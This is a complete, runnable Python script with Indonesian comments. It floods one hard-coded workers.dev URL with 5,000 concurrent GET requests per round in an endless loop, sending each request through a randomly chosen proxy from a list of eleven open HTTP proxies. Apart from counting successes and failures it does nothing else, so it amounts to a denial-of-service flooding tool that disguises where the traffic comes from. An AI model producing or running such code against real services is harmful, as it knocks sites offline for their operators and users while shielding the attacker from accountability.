import aiohttp
import asyncio
import random
import time

# Daftar proxy yang akan digunakan di seluruh eksekusi
proxy_list = [
    'http://23.152.40.15:3128',
    'http://115.85.181.243:80',
    'http://83.240.214.11:8080',
    'http://144.49.99.216:8080',
    'http://78.138.126.6:3128',
    'http://65.108.104.102:8080',
    'http://189.173.171.127:999',
    'http://144.49.99.169:8080',
    'http://177.71.137.117:3129',
    'http://20.120.240.49:80',
    'http://51.159.155.40:32013'
]

async def send_request_with_proxy(url, proxy):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy) as response:
                if response.status == 200:
                    return 'Success'
                else:
                    return 'Failed'
    except Exception as e:
        return 'Failed'

async def main():
    default_url = 'https://sxtcp.tg-index.workers.dev'  # URL default
    num_requests = 5000  # Jumlah permintaan yang ingin Anda kirim

    while True:
        tasks = []
        for _ in range(num_requests):
            proxy = random.choice(proxy_list)
            task = send_request_with_proxy(default_url, proxy)
            tasks.append(task)

        try:
            responses = await asyncio.gather(*tasks)
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return

        for response in responses:
            print(response)

    
if __name__ == "__main__":
    asyncio.run(main())
